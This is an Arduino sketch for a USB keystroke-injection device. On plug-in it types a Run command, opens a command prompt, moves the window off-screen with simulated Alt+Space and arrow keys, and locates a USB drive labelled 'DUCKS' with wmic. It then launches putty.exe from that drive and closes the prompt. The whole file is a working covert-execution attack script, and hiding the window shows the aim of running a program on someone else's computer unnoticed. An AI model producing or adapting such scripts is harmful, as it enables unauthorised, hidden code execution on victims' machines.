//DUCKS = My USB Drive label
//lesion = variable ,you can choose anything
//putty.exe = file in usb Drive

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("cmd /Q /D /T:7F /F:OFF /V:ON /K");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  Keyboard.print("M");

  for(int i = 0; i < 100; i++) {
    typeKey(KEY_DOWN_ARROW);
  }

  typeKey(KEY_RETURN);

  Keyboard.print("for /f %d in ('wmic volume get driveletter^, label ^| find \"DUCKS\"') do set lesion=%d");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("START %lesion%\\putty.exe && exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
